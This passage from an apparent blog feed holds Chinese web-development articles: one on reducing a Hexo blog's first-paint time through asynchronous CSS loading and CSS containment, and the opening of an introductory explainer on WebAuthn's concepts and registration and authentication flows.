98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div>从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/1.png\" width=\"1276\" height=\"279\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/2.png\" width=\"1386\" height=\"946\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/3.png\" width=\"860\" height=\"450\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/4.png\" width=\"1194\" height=\"946\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/5.png\" width=\"960\" height=\"500\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/6.png\" width=\"1090\" height=\"314\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/9.png\" width=\"813\" height=\"849\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/7.png\" width=\"800\" height=\"368\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中...」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/8.png\" width=\"1106\" height=\"945\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div>再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-10-03</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 \"An API for accessing Public Key Credentials\"，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 